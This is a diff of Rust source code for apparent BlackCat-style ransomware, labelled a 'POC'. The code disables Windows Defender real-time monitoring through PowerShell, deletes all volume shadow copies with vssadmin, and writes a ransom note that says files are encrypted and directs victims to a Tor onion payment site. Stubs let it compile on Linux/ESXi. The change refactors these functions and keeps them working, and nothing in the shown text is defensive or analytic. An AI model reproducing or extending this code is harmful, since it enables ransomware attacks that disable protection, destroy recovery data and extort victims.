@@ -4,46 +4,7 @@ pub struct WindowsPlatform;
 
 impl WindowsPlatform {
     #[cfg(target_os = "windows")]
-    pub fn disable_windows_defender() -> Result<(), String> {
-        let output = Command::new("powershell")
-            .args(&[
-                "-Command",
-                "Set-MpPreference -DisableRealtimeMonitoring $true",
-            ])
-            .output();
-
-        match output {
-            Ok(result) => {
-                if result.status.success() {
-                    Ok(())
-                } else {
-                    Err("Failed to disable Windows Defender".to_string())
-                }
-            }
-            Err(e) => Err(format!("Command execution failed: {}", e)),
-        }
-    }
-
-    #[cfg(target_os = "windows")]
-    pub fn delete_shadow_copies() -> Result<(), String> {
-        let output = Command::new("cmd")
-            .args(&["/c", "vssadmin delete shadows /all /quiet"])
-            .output();
-
-        match output {
-            Ok(result) => {
-                if result.status.success() {
-                    Ok(())
-                } else {
-                    Err("Failed to delete shadow copies".to_string())
-                }
-            }
-            Err(e) => Err(format!("Command execution failed: {}", e)),
-        }
-    }
-
-    #[cfg(target_os = "windows")]
-    pub fn create_ransom_note(directory: &str) -> Result<(), String> {
+    pub fn create_ransom_note(save_dir: &str, all_dirs: &str) -> Result<(), String> {
         let ransom_content = format!(
 r#"-->> Introduction
 Important files on your system was ENCRYPTED and now they have have "sttp" extension.
@@ -64,31 +25,32 @@ Recovery procedure
 Follow these simple steps to get in touch and recover your data:
 1. Download and install Tor Browser from: https://torproject.org/
 2. Navigate to: http://blackcat-site.onion/?(ACCESS_KEY)"#, 
-        directory);
+        all_dirs); // Вставляем список всех папок
 
-        let note_path = format!("{}\\README_BLACKCAT.txt", directory);
+        let note_path = format!("{}\\README_BLACKCAT.txt", save_dir);
         std::fs::write(&note_path, ransom_content)
             .map_err(|e| format!("Failed to create ransom note: {}", e))?;
         Ok(())
     }
 
-    // Заглушки для компиляции на Linux/ESXi
-    #[cfg(not(target_os = "windows"))]
+    #[cfg(target_os = "windows")]
     pub fn disable_windows_defender() -> Result<(), String> {
+        let _ = Command::new("powershell")
+            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
+            .output();
         Ok(())
     }
 
-    #[cfg(not(target_os = "windows"))]
+    #[cfg(target_os = "windows")]
     pub fn delete_shadow_copies() -> Result<(), String> {
+        let _ = Command::new("cmd").args(&["/c", "vssadmin delete shadows /all /quiet"]).output();
         Ok(())
     }
 
     #[cfg(not(target_os = "windows"))]
-    pub fn create_ransom_note(_directory: &str) -> Result<(), String> {
-        Ok(())
-    }
-
-    pub fn get_system_info() -> String {
-        "Windows System - BlackCat POC".to_string()
-    }
+    pub fn create_ransom_note(_d: &str, _l: &str) -> Result<(), String> { Ok(()) }
+    #[cfg(not(target_os = "windows"))]
+    pub fn disable_windows_defender() -> Result<(), String> { Ok(()) }
+    #[cfg(not(target_os = "windows"))]
+    pub fn delete_shadow_copies() -> Result<(), String> { Ok(()) }
 }
